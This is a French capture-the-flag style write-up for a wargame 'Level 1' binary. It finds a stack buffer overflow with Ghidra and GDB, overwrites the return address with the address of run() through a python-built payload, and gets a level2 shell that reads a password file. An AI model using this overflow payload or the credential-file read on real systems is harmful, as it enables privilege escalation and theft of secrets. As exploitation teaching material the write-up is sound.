### Level 1

#### Etape 01 :

On ouvre le binaire dans Ghidra et on lit le pseudo-code de `main` et `run`.

On remarque que :
- `run()` permet de lancer un shell avec les droits de `level2` ;
- `main()` contient un segfault exploitable pour écraser l'adresse de retour (RET).

Notre objectif est d'essayer d'appeler `run()` 
#### Etape 02 :

On cherche l'offset exact jusqu'à RET avec GDB.

On prépare une entrée de test :

```bash
python -c 'print "e" * 78' > /tmp/test
```

Puis on exécute :

```bash
gdb ./level1
run < /tmp/test
```

GDB indique un segfault à l'adresse `0xb7006565`.
Le motif `65` correspond au caractère `e`, ce qui montre que 2 octets de RET sont écrasés.
Donc l'offset de RET est : `78 - 2 = 76` octets.

#### Etape 03 :

On trouve l'adresse de `run()` avec :
```
(gdb) disas run
```
On remplace RET par l'adresse de `run()` (`0x08048444`) :

```bash
python -c 'print "e" * 76 + "\x44\x84\x04\x08"' > /tmp/payload
```

On exécute ensuite le binaire avec un `cat` pour garder `stdin` ouvert (sinon le shell se ferme immédiatement) :

```bash
cat /tmp/payload - | ./level1
```

Si l'exploit fonctionne, on obtient un shell avec les droits de `level2`.

#### Etape 04 :

Depuis ce shell, on lit le mot de passe du niveau suivant :

```bash
cat /home/user/level2/.pass
```



